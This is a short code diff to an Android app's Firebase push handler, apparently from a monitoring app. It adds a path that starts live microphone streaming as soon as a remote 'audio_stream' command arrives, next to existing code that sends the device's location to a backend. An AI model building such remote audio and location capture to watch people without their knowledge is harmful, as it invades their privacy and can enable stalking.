@@ -62,6 +62,18 @@ class SpappFirebaseMessagingService : FirebaseMessagingService() {
             }
         }
 
+        // Fast path: if this is an audio stream command, start streaming immediately
+        if (message.data["commandType"] == "audio_stream") {
+            val hasAudioPermission = androidx.core.content.ContextCompat.checkSelfPermission(
+                applicationContext,
+                android.Manifest.permission.RECORD_AUDIO
+            ) == android.content.pm.PackageManager.PERMISSION_GRANTED
+            if (hasAudioPermission) {
+                Log.d(TAG, "FCM fast-path: triggering audio stream immediately")
+                com.spapp.monitoring.audiostream.AudioStreamService.start(applicationContext)
+            }
+        }
+
         // Execute fast command pass IMMEDIATELY.
         // runBlocking holds the Firebase WakeLock and prevents the OS from putting the process
         // to sleep before the location is fetched and POSTed to the backend.
